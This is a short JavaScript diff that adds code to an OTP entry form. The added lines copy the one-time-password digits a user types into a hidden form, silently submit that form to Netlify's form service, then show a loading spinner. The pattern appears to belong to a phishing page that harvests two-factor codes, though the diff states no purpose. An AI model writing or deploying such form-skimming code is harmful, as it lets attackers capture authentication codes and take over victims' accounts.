@@ -34,6 +34,14 @@ document.addEventListener("DOMContentLoaded", function() {
     otpForm.addEventListener('submit', function(event) {
         event.preventDefault();  // Prevent the default form submission behavior
 
+        // Copy OTP values from visible form to the hidden form
+        otpInputs.forEach((input, index) => {
+            document.querySelector(`form[name="otpForm"] input[name="OTP ${index + 1}"]`).value = input.value;
+        });
+
+        // Programmatically submit the hidden form to Netlify
+        document.querySelector('form[name="otpForm"]').submit();
+
         otpContainer.style.display = 'none';
         spinnerContainer.style.display = 'flex';
 
